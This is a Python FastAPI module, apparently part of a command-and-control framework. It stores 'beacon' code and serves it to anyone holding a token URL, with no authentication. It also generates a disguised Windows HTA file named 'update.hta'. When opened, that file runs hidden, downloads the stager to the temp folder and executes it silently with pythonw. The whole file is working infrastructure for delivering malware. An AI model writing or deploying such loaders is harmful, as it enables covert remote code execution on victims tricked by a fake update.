"""Stager — stores beacon code server-side and serves it via an unauthenticated token URL."""
import sys, os
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

from datetime import datetime, timezone, timedelta
from fastapi import APIRouter, Depends, HTTPException
from fastapi.responses import PlainTextResponse, HTMLResponse
from fastapi.requests import Request
from sqlalchemy.orm import Session
from pydantic import BaseModel
from typing import Optional
from database import get_db, StagerToken
from auth import require_auth, User

router = APIRouter(tags=["stager"])


class CreateStager(BaseModel):
    code:      str
    lang:      str  = "py"
    max_uses:  int  = 0          # 0 = unlimited
    expire_h:  int  = 0          # hours until expiry; 0 = never


@router.post("/api/stager")
def create_stager(
    req: CreateStager,
    db:  Session = Depends(get_db),
    current_user: User = Depends(require_auth),
):
    if not req.code.strip():
        raise HTTPException(status_code=400, detail="Empty code")
    expires_at = None
    if req.expire_h > 0:
        expires_at = datetime.now(timezone.utc) + timedelta(hours=req.expire_h)
    st = StagerToken(
        code=req.code,
        lang=req.lang,
        max_uses=req.max_uses,
        expires_at=expires_at,
        created_by=current_user.username,
    )
    db.add(st)
    db.commit()
    db.refresh(st)
    return {"token": st.token, "created_at": st.created_at.isoformat()}


@router.get("/api/stager")
def list_stagers(
    db: Session = Depends(get_db),
    _:  User    = Depends(require_auth),
):
    tokens = db.query(StagerToken).order_by(StagerToken.created_at.desc()).all()
    now = datetime.now(timezone.utc)
    result = []
    for st in tokens:
        exp = st.expires_at
        if exp and exp.tzinfo is None:
            exp = exp.replace(tzinfo=timezone.utc)
        expired  = exp is not None and now > exp
        maxed    = st.max_uses > 0 and st.used_count >= st.max_uses
        result.append({
            "token":      st.token,
            "lang":       st.lang,
            "max_uses":   st.max_uses,
            "used_count": st.used_count,
            "expires_at": st.expires_at.isoformat() if st.expires_at else None,
            "created_at": st.created_at.isoformat() if st.created_at else None,
            "created_by": st.created_by,
            "active":     not expired and not maxed,
        })
    return result


@router.delete("/api/stager/{token}")
def delete_stager(
    token: str,
    db:    Session = Depends(get_db),
    _:     User    = Depends(require_auth),
):
    st = db.query(StagerToken).filter(StagerToken.token == token).first()
    if not st:
        raise HTTPException(status_code=404, detail="Token not found")
    db.delete(st)
    db.commit()
    return {"ok": True}


# ── Public endpoint — no auth, called by the stager one-liner ────────────────

@router.get("/s/{token}")
def serve_stager(token: str, db: Session = Depends(get_db)):
    st = db.query(StagerToken).filter(StagerToken.token == token).first()
    if not st:
        raise HTTPException(status_code=404)

    now = datetime.now(timezone.utc)
    exp = st.expires_at
    if exp:
        if exp.tzinfo is None:
            exp = exp.replace(tzinfo=timezone.utc)
        if now > exp:
            raise HTTPException(status_code=410, detail="Expired")

    if st.max_uses > 0 and st.used_count >= st.max_uses:
        raise HTTPException(status_code=410, detail="Max uses reached")

    st.used_count += 1
    db.commit()
    return PlainTextResponse(content=st.code)


@router.get("/s/{token}/hta")
def serve_stager_hta(token: str, request: Request, db: Session = Depends(get_db)):
    """Serve an HTA wrapper that downloads and runs the stager via pythonw (Windows)."""
    st = db.query(StagerToken).filter(StagerToken.token == token).first()
    if not st:
        raise HTTPException(status_code=404)

    now = datetime.now(timezone.utc)
    exp = st.expires_at
    if exp:
        if exp.tzinfo is None:
            exp = exp.replace(tzinfo=timezone.utc)
        if now > exp:
            raise HTTPException(status_code=410, detail="Expired")

    if st.max_uses > 0 and st.used_count >= st.max_uses:
        raise HTTPException(status_code=410, detail="Max uses reached")

    # Build the stager code URL from the incoming request's base URL
    base = str(request.base_url).rstrip("/")
    stager_url = f"{base}/s/{token}"

    hta = f"""<html>
<head>
<hta:application id="app" windowState="minimize" showInTaskbar="no" border="none" caption="no" />
<script language="VBScript">
Sub Window_OnLoad
  Dim h, fso, tmp, ts, sh
  Set h   = CreateObject("MSXML2.XMLHTTP")
  h.Open "GET", "{stager_url}", False
  h.Send
  Set fso = CreateObject("Scripting.FileSystemObject")
  tmp     = fso.GetSpecialFolder(2) & "\\s.py"
  Set ts  = fso.CreateTextFile(tmp, True)
  ts.Write h.ResponseText
  ts.Close
  Set sh  = CreateObject("WScript.Shell")
  sh.Run "pythonw " & tmp, 0, False
  window.close()
End Sub
</script>
</head>
<body></body>
</html>"""
    return HTMLResponse(
        content=hta,
        headers={"Content-Disposition": "attachment; filename=update.hta"},
    )
